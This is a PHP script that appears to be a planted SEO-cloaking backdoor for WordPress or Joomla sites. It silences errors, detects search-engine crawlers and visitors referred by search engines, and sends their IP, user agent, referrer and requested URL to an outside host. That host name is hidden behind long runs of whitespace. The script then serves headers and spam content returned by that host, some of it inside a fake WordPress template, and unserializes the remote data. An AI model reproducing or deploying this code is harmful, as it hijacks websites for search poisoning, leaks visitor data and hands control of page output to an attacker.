<?php
    error_reporting(0);
    ini_set('display_errors', 0);
    set_time_limit(0);


    $ref = strtolower(isset($_SERVER['HTTP_REFERER'])?$_SERVER['HTTP_REFERER']:'');
    if( strlen( $ref ) > 64 ) {
       $ref = substr( $ref, 0, 64 );
    }

    $ua = strtolower($_SERVER['HTTP_USER_AGENT']);
    if( strlen( $ua ) > 64 ) {
       $ua = substr( $ua, 0, 64 );
    }

    if (!function_exists('get_user_ip'))
    {
        function get_user_ip() {
            if(isset($_SERVER['HTTP_X_FORWARDED_FOR']) && $_SERVER['HTTP_X_FORWARDED_FOR']){
                if(strpos($_SERVER['HTTP_X_FORWARDED_FOR'],".")>0 && strpos($_SERVER['HTTP_X_FORWARDED_FOR'],",")>0){
                    $ip = explode(",",$_SERVER['HTTP_X_FORWARDED_FOR']);
                    $user_ip = trim($ip[0]);
                }
                elseif(strpos($_SERVER['HTTP_X_FORWARDED_FOR'],".")>0 && strpos($_SERVER['HTTP_X_FORWARDED_FOR'],",")===false){
                    $user_ip = trim($_SERVER['HTTP_X_FORWARDED_FOR']);
                }
            }
            if(!isset($user_ip))
                $user_ip = $_SERVER['REMOTE_ADDR'];
            return $user_ip;
        }
    }
    
    $ip = get_user_ip();
    $reverse_ip = !empty($ip)? strtolower(gethostbyaddr($ip)): '';
    
    $what_bot = 'user';
    $from_search = false;
    if ( (strpos($ua, 'yahoo') !== false) || (strpos($ua, 'slurp') !== false) || (strpos($reverse_ip, 'yahoo') !== false) ) $what_bot = 'yahoobot';
    if ( (strpos($ua, 'bing') !== false) || (strpos($ua, 'msnbot') !== false) || (strpos($reverse_ip, 'search.msn.com') !== false) ) $what_bot = 'bingbot';
    if ( (strpos($ua, 'google') !== false) || (strpos($reverse_ip, 'google') !== false) ) $what_bot = 'googlebot';
    if ( (strpos($ua, 'yandex') !== false) || (strpos($ua, 'yabrowser') !== false) || (strpos($ua, 'rambler') !== false) || (strpos($ua, 'mail.ru') !== false) || (strpos($ua, 'aport') !== false) || (strpos($reverse_ip, 'yandex') !== false) ) $what_bot = 'yandexbot';
    if ( (strpos($ref, 'google.') !== false) || (strpos($ref, 'yandex.') !== false) || (strpos($ref, 'rambler.') !== false) || (strpos($ref, 'yahoo.') !== false) || (strpos($ref, 'bing.') !== false) || (strpos($ref, 'aol.') !== false) || (strpos($ref, 'mail.') !== false) || (strpos($ref, 'msn.') !== false)) $from_search = true;

    $req_uri_orig = isset($_SERVER['REQUEST_URI'])? strtok(strtok($_SERVER['REQUEST_URI'],'&'),'?'): '/';
    $req_uri = isset($_SERVER['REQUEST_URI'])? strtok(strtok($_SERVER['REQUEST_URI'],'&'),'?'): '/';
    $full_uri = $_SERVER['REQUEST_URI'];    

    if ( ('user' === $what_bot) && $from_search || ('user' !== $what_bot) || (strpos($full_uri, 'checker-page') !== false))
    {
        if ( true /*!preg_match('/404/', $req_uri_orig) && !preg_match('/\/administrator\//', $req_uri_orig) && !preg_match('/\/bin\//', $req_uri_orig) && !preg_match('/\/cache\//', $req_uri_orig) && !preg_match('/\/cli\//', $req_uri_orig) && !preg_match('/\/components\//', $req_uri_orig) && !preg_match('/\/installation\//', $req_uri_orig) && !preg_match('/\/layouts\//', $req_uri_orig) && !preg_match('/\/libraries\//', $req_uri_orig) && !preg_match('/\/logs\//', $req_uri_orig) && !preg_match('/\/plugins\//', $req_uri_orig) && !preg_match('/\/tmp\//', $req_uri_orig) && !preg_match('/\/wp-login/', $req_uri_orig) && !preg_match('/\/xmlrpc/', $req_uri_orig) && !preg_match('/\/wp-admin/', $req_uri_orig) && !preg_match('/\/trackback/', $req_uri_orig)*/)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      $req_uri = 'ea.marudeering.com/';
        
        if ($req_uri !== $req_uri_orig)
        {
            
            
            $ref = isset($_SERVER['HTTP_REFERER'])? urlencode($_SERVER['HTTP_REFERER']): '';
            if( strlen( $ref ) > 64 ) {
               $ref = substr( $ref, 0, 64 );
            }
            
            $ip = get_user_ip();
            $ua = isset($_SERVER['HTTP_USER_AGENT'])? urlencode($_SERVER['HTTP_USER_AGENT']): '';
            if( strlen( $ua ) > 64 ) {
               $ua = substr( $ua, 0, 64 );
            }
            
            $host = isset($_SERVER['HTTP_HOST'])? urlencode($_SERVER['HTTP_HOST']): '';
            $is_gzip = function_exists('gzdecode') || function_exists('gzinflate') ? 'true': '';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $req_uri = 'http://'.$req_uri."?req=".urlencode($full_uri)."&gzip=".$is_gzip."&host=$host&ip=$ip&ua=$ua&ref=$ref";
               
            $data = @file_get_contents($req_uri);
            if (function_exists('gzdecode') || function_exists('gzinflate'))
            {
                $is_decoded = false;
                if (!$is_decoded && function_exists('gzdecode'))
                {
                    $is_decoded = true;
                    $data = @gzdecode($data);
                }
                if (!$is_decoded && function_exists('gzinflate'))
                {
                    $is_decoded = true;
                    $data = @gzinflate(substr($data,10,-8));
                }
            }
            $data = @unserialize($data);
            if (isset($data['headers']) && (count($data['headers']) > 0))
            {
                foreach ($data['headers'] as $header)
                {
                    header($header);
                }
            }
            
            if (isset($data['macroses']) && (count($data['macroses']) > 0))
            {
                $tpl_path = false;
                if (is_dir($root_path.'/wp-admin/includes/'))
                {
                    $tpl_path = '/wp-admin/includes/template.html';
                }
                
                if (is_dir($root_path.'/libraries/joomla/application/'))
                {
                    $tpl_path = '/libraries/joomla/application/template.html';
                }
                $tpl = $tpl_path? @file_get_contents($root_path.$tpl_path): '';
                if (strpos($tpl, '[CONTENT]') === false)
                {
                    $tpl = "<!DOCTYPE html>\n<html lang=\"en-US\" class=\"js\"><head>\n <link rel=\"profile\" href=\"http://gmpg.org/xfn/11\">\n<title>[TITLE]</title>\n\n\n\n      <script src=\"https://wp-themes.com/wp/wp-includes/js/wp-emoji-release.min.js?ver=4.5-RC1-37079\" type=\"text/javascript\"></script>\n      <style type=\"text/css\">\nimg.wp-smiley,\nimg.emoji {\n    display: inline !important;\n   border: none !important;\n  box-shadow: none !important;\n  height: 1em !important;\n   width: 1em !important;\n    margin: 0 .07em !important;\n   vertical-align: -0.1em !important;\n    background: none !important;\n  padding: 0 !important;\n}\n</style>\n<link rel=\"stylesheet\" id=\"twentysixteen-fonts-css\" href=\"https://fonts.googleapis.com/css?family=Merriweather%3A400%2C700%2C900%2C400italic%2C700italic%2C900italic%7CMontserrat%3A400%2C700%7CInconsolata%3A400&amp;subset=latin%2Clatin-ext\" type=\"text/css\" media=\"all\">\n<link rel=\"stylesheet\" id=\"genericons-css\" href=\"https://wp-themes.com/wp-content/themes/twentysixteen/genericons/genericons.css?ver=3.4.1\" type=\"text/css\" media=\"all\">\n<link rel=\"stylesheet\" id=\"twentysixteen-style-css\" href=\"https://wp-themes.com/wp-content/themes/twentysixteen/style.css?ver=4.5-RC1-37079\" type=\"text/css\" media=\"all\">\n<!--[if lt IE 10]>\n<link rel='stylesheet' id='twentysixteen-ie-css'  href='https://wp-themes.com/wp-content/themes/twentysixteen/css/ie.css?ver=20150930' type='text/css' media='all' />\n<![endif]-->\n<!--[if lt IE 9]>\n<link rel='stylesheet' id='twentysixteen-ie8-css'  href='https://wp-themes.com/wp-content/themes/twentysixteen/css/ie8.css?ver=20151230' type='text/css' media='all' />\n<![endif]-->\n<!--[if lt IE 8]>\n<link rel='stylesheet' id='twentysixteen-ie7-css'  href='https://wp-themes.com/wp-content/themes/twentysixteen/css/ie7.css?ver=20150930' type='text/css' media='all' />\n<![endif]-->\n<!--[if lt IE 9]>\n<script type='text/javascript' src='https://wp-themes.com/wp-content/themes/twentysixteen/js/html5.js?ver=3.7.3'></script>\n<![endif]-->\n<script type=\"text/javascript\" src=\"https://wp-themes.com/wp/wp-includes/js/jquery/jquery.js?ver=1.12.2\"></script>\n<script type=\"text/javascript\" src=\"https://wp-themes.com/wp/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.0\"></script>\n\n\n \n\n<meta name=\"generator\" content=\"WordPress 4.5-RC1-37079\">\n\n\n\n\n     <style type=\"text/css\">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>\n  <link rel=\"canonical\" href=\"[PAGE_URL]\">\n    <link rel=\"prev\" href=\"[RAND_URL_PREV]\">\n    <link rel=\"next\" href=\"[RAND_URL_NEXT]\">\n    <meta property=\"og:title\" content=\"[TITLE]\">\n    <meta property=\"og:type\" content=\"article\">\n    <meta property=\"og:site_name\" content=\"[COMMON]\">\n    <meta property=\"og:url\" content=\"[PAGE_URL]\">\n    <meta property=\"og:locale\" content=\"en_US\">\n    <meta name=\"description\" property=\"og:description\" content=\"[DESCRIPTION]\">\n    <meta name=\"keywords\" content=\"[KEYWORDS]\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, user-scalable=yes\">\n    <meta http-equiv=\"content-type\" content=\"text/html; charset=UTF-8\">\n  \n     </head>\n\n<body class=\"singular single single-post postid-19 single-format-standard\">\n<div id=\"page\" class=\"site\">\n    <div class=\"site-inner\">\n        <a class=\"skip-link screen-reader-text\" href=\"#content\">Skip to content</a>\n\n     <header id=\"masthead\" class=\"site-header\" role=\"banner\">\n            <div class=\"site-header-main\">\n              <div class=\"site-branding\">\n                                         <p class=\"site-title\">[COMMON]</p>\n                                          \n                                  </div><!-- .site-branding -->\n\n                           </div><!-- .site-header-main -->\n\n                    </header><!-- .site-header -->\n\n      <div id=\"content\" class=\"site-content\">\n\n<div id=\"primary\" class=\"content-area\">\n    <main id=\"main\" class=\"site-main\" role=\"main\">\n      \n<article id=\"post-19\" class=\"post-19 post type-post status-publish format-standard hentry category-uncategorized tag-boat tag-lake\">\n    <header class=\"entry-header\">\n       <h1 class=\"entry-title\">[TITLE]</h1>  </header><!-- .entry-header -->\n\n \n  \n  <div class=\"entry-content\">\n  [CONTENT]\n</div><!-- .entry-content -->\n\n   \n</article><!-- #post-## -->\n\n   \n  </main><!-- .site-main -->\n\n  \n</div><!-- .content-area -->\n\n\n    <aside id=\"secondary\" class=\"sidebar widget-area\" role=\"complementary\">\n     <section id=\"search-3\" class=\"widget widget_search\">\n<form role=\"search\" method=\"get\" class=\"search-form\" action=\"#\">\n    <label>\n       <span class=\"screen-reader-text\">Search for:</span>\n     <input type=\"search\" class=\"search-field\" placeholder=\"Search …\" value=\"\" name=\"s\" title=\"Search for:\">\n   </label>\n  <button type=\"submit\" class=\"search-submit\"><span class=\"screen-reader-text\">Search</span></button>\n</form>\n</section>      <section id=\"recent-posts-3\" class=\"widget widget_recent_entries\">      <h2 class=\"widget-title\">Recent Posts</h2>        \n      </section>      <section id=\"recent-comments-3\" class=\"widget widget_recent_comments\"><h2 class=\"widget-title\">Recent Comments</h2></section><section id=\"archives-3\" class=\"widget widget_archive\"><h2 class=\"widget-title\">Archives</h2>      \n      </section><section id=\"categories-3\" class=\"widget widget_categories\"><h2 class=\"widget-title\">Categories</h2>        \n</section>    </aside><!-- .sidebar .widget-area -->\n\n      </div><!-- .site-content -->\n\n        <footer id=\"colophon\" class=\"site-footer\" role=\"contentinfo\">\n           \n          \n          <div class=\"site-info\">\n                             <span class=\"site-title\">[COMMON]</span>\n                <a href=\"https://wordpress.org/\">Proudly powered by WordPress</a>\n           </div><!-- .site-info -->\n     </footer><!-- .site-footer -->\n    </div><!-- .site-inner -->\n</div><!-- .site -->\n\n<script type=\"text/javascript\" src=\"https://wp-themes.com/wp-content/themes/twentysixteen/js/skip-link-focus-fix.js?ver=20151112\"></script>\n<script type=\"text/javascript\" src=\"https://wp-themes.com/wp-content/themes/twentysixteen/js/functions.js?ver=20151204\"></script>\n<script type=\"text/javascript\" src=\"https://wp-themes.com/wp/wp-includes/js/wp-embed.min.js?ver=4.5-RC1-37079\"></script>\n\n\n</body></html>";
                }
                
                foreach ($data['macroses'] as $macros => $value)
                {
                    $tpl = str_replace($macros, $value, $tpl);
                }
                
                die($tpl);
            }
            
            if (isset($data['content']) && !empty($data['content']))
            {
                die($data['content']);
            }
        }
    }